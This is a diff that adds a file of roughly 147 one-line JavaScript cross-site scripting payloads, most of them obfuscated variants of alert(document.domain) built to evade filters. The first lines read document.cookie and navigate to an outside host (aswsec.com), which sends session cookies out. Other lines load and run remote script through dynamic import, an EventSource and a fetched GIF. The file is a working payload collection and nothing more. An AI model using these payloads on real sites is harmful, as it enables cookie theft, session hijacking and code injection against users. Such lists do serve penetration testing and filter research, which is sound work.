@@ -1,0 +1,147 @@
+{x='https://www.aswsec.com/?'}{y=document[`cookie`]}navigation['navigate'](`${x}${y}`);
+{x='https://www.aswsec.com/?'}{y=document[`cookie`]}navigation['navigate'](x+y);
+{x=globalThis}{y=alert.bind(x)}y(x['document']['domain']);
+{x=globalThis}{y=open.bind(x)}y.call(this,['javascript:alert(document.domain)']);
+alert.call(globalThis,document.domain);
+globalThis[[String(['a']+[['le']]+'rt')]]/**/(document[String`do`+`main`]);
+x=(y)=>alert;x``(document.domain);
+x=(y)=>alert;x()(document.domain);
+(async()=>{await import("https://examples.aswsec.com/javascript/simple-alert.php");})();//CORS-Problem-needed
+var evtsrc=new EventSource('https://examples.aswsec.com/javascript/event-source.php',{withCredentials:true});evtsrc.addEventListener("xss",(event)=>{var payload=JSON.parse(event.data).payload;new Function(payload).call();});//CORS NEEDED - SUPER ANNOYING PAYLOAD/Need To Find a way to evtsrc.close();
+document.addEventListener('mouseover',function(){globalThis['alert'](document['domain'])});//Very annoying payload
+globalThis['document'].addEventListener('cl'+'ic'+'k',(e)=>{globalThis['alert'](globalThis['document'].domain);});
+globalThis['document'].getElementsByTagName('body')[0].addEventListener('mou'+'seen'+'ter',(e)=>{globalThis['alert'](globalThis['document'].domain);});
+globalThis['document'].querySelectorAll('h1').forEach(el=>{el.addEventListener('mous'+'een'+'ter',()=>{el.closest('h1').innerText=globalThis['document'].domain;})});
+(()=>{globalThis['alert'](globalThis['document'].domain)})();
+document.body.appendChild(document.createElement('xss-test'));class xss extends HTMLElement{constructor(){var s=super();s.setAttribute('onmous'+'eenter','ale'+'rt(document.domain)');s.innerText='abcdef';}};customElements.define('xss-test',xss);
+function xss(t){var p=function(a){return a+t;};return p;};var fn=xss('lert');let a=fn('a');fn=xss('ment.domain');let b=fn('docu');new Function(a+'('+b+')').call();
+function fn(text,callback){setTimeout(function(){callback(text);},100);}fn(document['domain'],alert);
+var o={a:globalThis.alert,d:document};var{a,d}=o;a(d.domain);
+var x=alert;var z=document['domain'];function y(){this.x(this.z)};y.call(window);
+function a(b){return globalThis[b];};a('alert')(a('document')['domain']); 
+function x(c,p){return window[c](document[p]);};x('alert','domain');
+function c(f) {return function(a){return function(b){return f(a,b);};};}function x(a,b){return a(b);};let cx=c(x);cx(alert)(document.domain);
+var e='eva';globalThis[e+'l']('aler'+''+'t(docume'+'nt.do'+''+'main'+''+')');
+var e=globalThis.eval;e('a'+'le'+'rt'+''+'(docum'+'ent'+'.'+'dom'+'ain)'+'');
+function s(str){var keys=str.split``.reverse``.join``.split(/[\.\[\]'"]/).filter(e=>e);var ret=window;keys.forEach(key=>{ret=ret[key];});return ret;};s('trela')(s('niamod.tnemucod'));
+document.defaultView['a'+'lert'](this.document['domain']);
+var fn={a:alert}["a"];fn(document.domain);
+var f='alert';var p=document.domain;this[f](p);
+var f='alert';var p=document.domain;globalThis[f](p);
+var a=[alert,document];var x=a[0];x(a[1].domain);
+function e(s,c){return(new Function('with(this){ return '+s+'}')).call(c);};e('a'+'lert',globalThis)(e('documen'+''+'t'+'.doma'+''+'in'));
+var xssobj={payload:null,fn:null};with(xssobj){payload=document;fn=alert};var doit=xssobj.fn;doit(xssobj.payload.domain);
+!function(w,d){fn=w.alert;doc=d['domain'];fn(doc);}(globalThis,document);
+~function(w,d){fn=w.alert;doc=d['domain'];fn(doc);}(globalThis,document);
+-function(w,d){fn=w.alert;doc=d['domain'];fn(doc);}(globalThis,document);
++function(w,d){fn=w.alert;doc=d['domain'];fn(doc);}(globalThis,document);
+(function(fn,x){return fn(x);}(alert,document.domain));
+var x={a:alert,b:document};var y={b:x.b['domain'],c:function(){return x.a;}};var y=Object.assign(x,y);y.c()(y.b);
+var fn=function(){};fn.doc=document;fn.xss=alert;x=fn.xss;x(fn.doc.domain);
+var w={x:alert,y:document,z:function(){return this.x;}};w.z()(w.y['domain']);
+var t=JSON.stringify('\u0061\u006c\u0065\u0072\u0074\u0028\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0064\u006f\u006d\u0061\u0069\u006e\u0029');eval(JSON.parse(t));
+var o=Object.fromEntries([["w",window],["d",document]]);o.w['alert'](o.d[''+'dom'+'ain'+'']);
+var x={slotwin:window,slotdoc:document};var y=Object.fromEntries(Object.entries(x).filter(([k,v])=>k.startsWith('slot')));y.slotwin.prompt`${y.slotdoc.domain}`;
+var x=this;var i=0;do{x=x.parent;++i;}while(i<10);var t=v=>prompt`${v.domain}`;t(x.document);
+'alert\x28document.domain\x29'instanceof{[Symbol.hasInstance]:eval}
+function t(r,s){r.prompt`${s.domain}`;};t(window,document);
+function w(s){return`${s.domain}`;}var x=window;var y=x.document;var z=w(y);x.prompt`${z}`;
+function x(s){return`${s.domain}`;}var y=document;var z=x(y);prompt`${z}`;
+function xss(){this.doIt=alert;this.payload=document};var g=new xss();var a=g.doIt;a(g.payload.domain);
+t={};p=new Proxy(t,{}).w=window;t.w['a'+'ler'+'t'](t.w['d'+'ocu'+'ment'].domain);
+var p=[1].fill`a`.concat([1].fill`l`).concat([1].fill`e`).concat([1].fill`r`).concat([1].fill`t`).join``;w=window;w[p](w[`document`][`domain`]);
+var p=[1].fill`a`.concat`${[1].fill`l`}`.concat`${[1].fill`e`}`.concat`${[1].fill`r`}`.concat`${[1].fill`t`}`.join``;w=window;w[p](w[`document`][`domain`]);
+class xss{constructor(w,d){this.w=w;this.d=d}};var x=new xss(window,document);x.w['alert'](x.d['domain']);
+class a{static doIt(){return globalThis['alert'];};};class b extends a{static xss(){`${super.doIt()(document.domain)}`;}};b.xss();
+var xss=x=>prompt`${x}`;xss(document.domain);
+var xss=x=>prompt(`${x}`);xss(document.domain);
+var xss={w:window,x:'alert',y:'document',z:'domain'};xss.w[xss.x](xss.w[xss.y][xss.z]);
+var x=()=>{return document.domain;};prompt`${`${x()}`}`;
+var x=(v)=>{return globalThis[v];};x('alert')(x('document')['domain']);
+{x='cookie'}{y=(z)=>{return document[z]}};{alert(y(x))};
+Object.defineProperties(globalThis,{'fn':{value:alert},'val':{value:document}});globalThis.fn(val['domain']);
+[].sort.call`${alert}xss`;
+Function(')niamod.tnemucod(trela'.split``.reverse``.join``)();
+Function`xss${'alert\x28document.domain\x29'}xss```;
+var t="axlexxrtxxxx(dxoxcxuxmxexnxt.xdxoxmxaxixn)";var x="";var r=/([a\(dojvsumcp\)int.rel])/gi;var v=t.matchAll(r);for(m of v){x+=(m[1]);}eval(x); 
+x='axl exr tx(xd oxc ux m xxe xxxxxn xt .xxx xdx ox m xxxax ix n)'.\u{72}\u{65}\u{70}\u{6c}\u{61}\u{63}\u{65}(/[x ]/g,'');\u{0000065}\u{0000076}\u{0000061}\u{000006c} (`${x}`);
+var x=function(){return this;};var y=x().alert;var z=x().document;y(`${z.domain}`);
+[].filter((function(){return this;}()).alert(document.domain));
+document.getElementsByTagName('body')[0].innerHTML=document.domain;
+document.getElementsByTagName`body`[0].innerHTML=document.domain;
+Window.prototype.xss=function(){return alert};Window.prototype.payload=function(){return document;};window.xss()(window.payload().domain);
+(null||window['a'+'le'+'rt'])((null||document).domain);
+(null??window.open)((null??document).domain);
+(null??eval)("alert")(document.domain);
+(0||eval)("alert")(document.domain);
+a='al'+'er'+'t';window[a](document.domain);
+var w=window;w[['a','l'].concat(['er','t']).join``](w.document['domain']);
+window[['a',['l',['er','t']]].flat().flat().join``](document['domain']);
+window[String['fromCharCode'](98-1,110-2,102-1,116-2,119-3)](document[`domain`]);
+window[String.fromCharCode(...[98,109,102,115,117].map(v=>v-1))](document[`domain`]);
+var a=['a','l','e','r','t']; var m=a.map(el=>el+'').join``;window[m](document.domain);
+window[atob(`YWxlcnQ=`)](document.domain);
+window[atob(`YWxlcnQ=`)](document[atob`ZG9tYWlu`]);
+window['trela'.split``.reverse``.join``](document.domain);
+window['trela'.split``.reverse``.join``](document['niamod'.split``.reverse``.join``]);
+x='trela'.split("").reverse().join("");window[x](document.domain);
+var fn=["a","l"];fn.push("e","r","t");var w=window;d=document;window[fn.join``](d.domain);
+var c=["t","r","e","l","a"];p=c.pop();p+=c.pop();p+=c.pop();p+=c.pop();p+=c.pop();w=window;d=document;w[p](d.domain);
+var c=["t","r","e","l","a"];p=c.pop``;p+=c.pop``;p+=c.pop``;p+=c.pop``;p+=c.pop``;w=window;d=document;w[p](d.domain);
+var c='balert'.split('');c.shift();s=c.shift();s+=c.shift();s+=c.shift();s+=c.shift();s+=c.shift();w=window[s];d=document;w(d.domain);
+globalThis['alert'](globalThis[''+'doc'+'ument'+''].domain);
+globalThis['trela'.split``.reverse``.join``](globalThis['tnemucod'.split``.reverse``.join``].domain);
+var a='xssalertxss'.split('');w=window;d=document;w[a.slice(3,-3).join('')](d.domain);
+d=document;a=[d.domain];w=window;w.prompt.apply(null,[...a]);
+var fn=new Function('globalThis[this.x](this.y)');function xss(x,y){this.x=x;this.y=y;fn.apply(this,[]);}new xss('a'+'ler'+'t',document['domain']);
+a=[['r','t'],['l','e'],['a']];d=a.reduceRight((b,c)=>b.concat(c)).join('');e=window;f=document;e[d](f.domain);
+function xss(x,y){this.x=x;this.y=y.domain};xss.prototype.toXSS=function(){this.x['alert'](this.y)};xplt=new xss(window,document);xplt.toXSS();
+var s="";var v1=[];var v=await Promise.allSettled([new Promise((resolve, reject)=>setTimeout(reject,100,'ale')),new Promise((resolve,reject)=>setTimeout(reject,100,'rt(')),new Promise((resolve,reject)=>setTimeout(reject,100,'documen')),new Promise((resolve,reject)=>setTimeout(reject,100,'t.doma')),new Promise((resolve,reject)=>setTimeout(reject,100,"in)"))]).then((results)=>v1=results).catch((err)=>v=err);v1.forEach(element=>s+=element.reason);eval(s);
+var a=new Promise((fn,rfn)=>{fn(document.domain);});a.then((val)=>w=window['trela'.split('').reverse().join``](val));
+var w=window;var athen={then(onS,onR){onS({then(onS,onR) {onS(['trela'.split``.reverse``.join``,document]);},});},};Promise.resolve(athen).then((v)=>{w[v[0]](v[1].domain)});
+var fn=function*(){yield ')niamod.tnemucod(trela'.split``.reverse``};v=fn().next().value;var w=window;(function(fn,x){return fn(x);}(w['lave'.split``.reverse``.join``],v.join``)); 
+function* x(){yield alert;}{y=x()}{z=y.next().value}{z(document.domain)}
+var v=[];var gf=(function*(){}).constructor;var g=new gf('yield ")niamod.tnemucod(trela".split("").reverse().forEach(element=>v.push(element))');var iterator=g().next().value;var w=window;(function(fn,x){return fn(x);}(w['lave'.split``.reverse``.join``],v.join``));
+function x(){this.obj={win: function(){return window;},doc: function(){return document;}}};var o=new x();o.obj.win()['alert'](o.obj.doc()['domain']);
+function s(o){var str='';for(var k in o){if (o.hasOwnProperty(k)){str+=o[k];}}return str;};function x(a,b,c,d){this.a=a;this.b=b;this.c=c,this.d=d;};function y(a,b,c,d){x.call(this,a,b,c,d)};var e='eva';globalThis[e+'l'](s(new y('aler','t(docu','ment.d','omain)')));
+let xss={fn:"",text:"",};xss=new Proxy(xss,{get(t,p,r){return Reflect.get(t,p,r);},set(t,p,v,r){return Reflect.set(t,p,v,r);}});xss.fn=alert;xss.text=document['domain'];let fn=xss.fn;fn(xss.text);
+\u0061\u006c\u0065\u0072\u0074(\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0064\u006f\u006d\u0061\u0069\u006e);
+\u0061ler\u{74}(document.domain);
+\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});
+\u{61}\u{6c}\u{65}\u{72}\u{74}(\u{64}\u{6f}\u{63}\u{75}\u{6d}\u{65}\u{6e}\u{74}.\u{64}\u{6f}\u{6d}\u{61}\u{69}\u{6e});
+eval(String.fromCharCode(0x10000000000061,0x1000000000006c,0x10000000000065,0x10000000000072,0x10000000000074,0x10000000000028,0x10000000000064,0x1000000000006f,0x10000000000063,0x10000000000075,0x1000000000006d,0x10000000000065,0x1000000000006e,0x10000000000074,0x1000000000002e,0x10000000000064,0x1000000000006f,0x1000000000006d,0x10000000000061,0x10000000000069,0x1000000000006e,0x10000000000029));
+function xss() { \u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});}new xss;
+function* xss(){\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e})};[,]={[Symbol.iterator]:xss};
+function* xss(){\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});};[...{[Symbol.iterator]:xss}];
+function xss(){\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});}var proxy=new Proxy({},{get:xss});proxy._;
+function xss(){\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});}var proxy=new Proxy({},{has:xss});1 in proxy;
+function xss(){\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});} 1 instanceof{[Symbol.hasInstance]:xss};
+var xss=(function(){\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});})();xss;
+function xss(){\u{000000000061}\u{00000000006c}\u{000000000065}\u{000000000072}\u{000000000074}(\u{000000000064}\u{00000000006f}\u{000000000063}\u{000000000075}\u{00000000006d}\u{000000000065}\u{00000000006e}\u{000000000074}.\u{000000000064}\u{00000000006f}\u{00000000006d}\u{000000000061}\u{000000000069}\u{00000000006e});}var proxy=new Proxy({},{has:xss});let x={toString:xss};''+x;
+var x=function(){return this;};var y=x().\u{61}\u{6c}\u{65}\u{72}\u{74};var z=x().\u{64}\u{6f}\u{63}\u{75}\u{6d}\u{65}\u{6e}\u{74};y(`${z.\u{64}\u{6f}\u{6d}\u{61}\u{69}\u{6e}}`);
+(typeof this.alert==='function'?(function(){return this.alert})()(this.document.\u{64}\u{6f}\u{6d}\u{61}\u{69}\u{6e}):null);
+(typeof this.alert==='function'?(function(){return this.alert})()((typeof this.document==='object'?(function(){return this.document})().domain:null)):null);
+(function(fn,x){return fn(x);}(\u{61}\u{6c}\u{65}\u{72}\u{74},\u{64}\u{6f}\u{63}\u{75}\u{6d}\u{65}\u{6e}\u{74}.\u{64}\u{6f}\u{6d}\u{61}\u{69}\u{6e}));
+var a='abcdefghijklmnopqrstuvwxyz';new Function(a[0]+a[11]+a[4]+a[17]+a[19]+'('+a[3]+a[14]+a[2]+a[20]+a[12]+a[4]+a[13]+a[19]+'.'+a[3]+a[14]+a[12]+a[0]+a[8]+a[13]+')')();
+document.open('javascript:alert(document.domain)','', 'noopener=false')
+self['alert'] ( self ['document'] ['domain'] );
+speechSynthesis.speak(new SpeechSynthesisUtterance(document ['domain']));//embedded in a page this seems to function fine on safari on Mac. On Windows it was tested successfully on FireFox and MS Edge.
+x=document.createElement('img');x['addEventListener']('error',function(){fetch(this.src).then((r)=>r.text()).then((t)=>{eval(t);})});x.src='/poc/simplejs.gif';document.body.appendChild(x);//THE GIF file WOULD BE MALFORMED WITH A JS PAYLOAD
+x='<im'+'g src=x'+' oner'+'ror=al'+'ert\x28doc'+'ument.d'+'omain\x29>';globalThis['do'+'cument']['creat'+'eRange']``['createContextualFragment'](x);
+globalThis['name']='ja'+'va'+'scr'+'ipt'+':'+'aler'+'t('+'docu'+'ment'+'.'+'dom'+'ain)';globalThis['loc'+'ation']=name;
+globalThis['name']='javascript:alert\x28document.domain\x29';Reflect.set.call`${location}${'href'}${name}`;
+navigation['navigate']`javascript:alert\x28document.domain\x29`
+[]["fill"]["constructor"]("al\x65r\x74`XSSPAYLOARD`").call();
+[]["fill"]["constructor"]("al\x65r\x74`XSSPAYLOARD`").apply();
+[]["fill"]["constructor"]("al\x65r\x74`XSSPAYLOARD`")();
+[]["fill"]["constructor"]("al\x65r\x74`XSSPAYLOARD`")``;
+alert.apply(this,[document.domain]);
+alert.call(this,[document.domain]);
+{x='telra'}{(0||eval)(x[4]+x[2]+x[1]+x[3]+x[0])(document.domain)}
+{x='telra'}{y=x[4]+x[2]+x[1]+x[3]+x[0]}(null??eval)(y)(document.domain)
+{x='telra'}{y=x[4]+x[2]+x[1]+x[3]+x[0]}{new Function(y+'(document.domain)')()}
+function telra(){{x=telra.name}{y=x[4]+x[2]+x[1]+x[3]+x[0]}(null??eval)(y)(document.domain)}{telra()} 
+{a="l".charCodeAt(0)}{new Function(String.fromCharCode(a-11,a,a-7,a+6,a+8)+'(document.domain)')()}
+{x=alert}{(0||eval)(x.name)(document.domain)}
+{function x(){return alert}}x()(document.domain)
+(()=>{{x='tcirps';y=x[5]+x[1]+x[3]+x[2]+x[4]+x[0]}{document['writeln']('<'+y+'>alert(document.domain)</'+y+'>')}})();
